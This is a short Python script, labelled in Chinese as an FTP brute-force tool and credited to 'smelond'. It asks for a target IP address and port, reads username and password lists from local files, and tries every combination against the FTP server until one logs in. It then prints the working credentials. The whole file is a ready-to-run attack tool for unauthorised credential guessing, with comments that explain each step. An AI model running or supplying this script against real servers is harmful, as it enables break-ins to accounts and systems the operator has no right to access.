#!/usr/bin/env python
# _*_ coding:utf-8 _*_
# File_type:
# Filename:
# Author:

from ftplib import FTP
from itertools import product  # 导入笛卡尔积模块

result_user, result_pass = [], []  # 两个列表，用于存放所有的用户名和密码
ftp = FTP()
print("FTP爆破【作者：smelond】".center(100, "*"))
HOST = input("请输入IP地址：")
PORT = int(input("请输入端口号："))


def scan():
    for line in open("user", "r"):  # 循环读取这个文件
        result_user.extend(line.strip().split(' '))  # 将读取的文件进行去除换行、切片,放入列表中
    for line in open("password", "r"):
        result_pass.extend(line.strip().split(' '))
    for username, passwd in product(result_user, result_pass):  # 使用笛卡尔积模块
        try:
            ftp.connect(HOST, PORT, 5)  # IP地址，端口号，超时时间
            print("尝试：%s/%s" % (username, passwd))
            ftp.login(username, passwd)  # 登录的账号和密码
            print("登录成功 %s/%s" % (username, passwd))
            ftp.quit()  # 成功后退出
            return username, passwd
        except Exception:
            pass  # 如果出现异常跳出
    print("爆破失败")  # 没有正确的账号或密码


if __name__ == '__main__':
    scan()  # 调用函数
